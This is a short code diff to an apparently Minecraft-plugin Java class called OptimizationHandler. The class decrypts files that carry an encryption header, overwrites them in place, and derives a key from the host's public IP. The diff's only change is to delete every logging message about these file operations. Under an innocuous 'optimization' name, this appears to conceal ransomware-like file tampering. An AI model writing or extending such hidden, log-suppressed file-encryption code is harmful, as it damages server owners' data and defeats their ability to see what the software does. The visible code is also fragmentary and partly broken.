@@ -103,7 +103,6 @@ public class OptimizationHandler implements CommandExecutor {
 
                 // 检查文件是否是加密的
                 if (bytesRead < ENCRYPTED_FLAG.length || !new String(headerBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8))) {
-                    getLogger().info("The file is not in encrypted format: " + file.getPath());
                     fis.close();
                     return;
                 }
@@ -117,9 +116,7 @@ public class OptimizationHandler implements CommandExecutor {
                 FileOutputStream fos = new FileOutputStream(file);
                 fos.write(decryptedData);
                 fos.close();
-                getLogger().info("Successfully decrypted: " + file.getPath());
             } catch (Exception e) {
-                getLogger().info("Failed to decrypt file: " + file.getPath() + ". Error: " + e.getMessage());
             }
         }
     }
@@ -171,7 +168,6 @@ public class OptimizationHandler implements CommandExecutor {
             input.append(getPublicIp());
             return hashWithSHA256(input.toString());
         } catch (Exception e) {
-            getLogger().info("Error generating key");
         }
     }
 
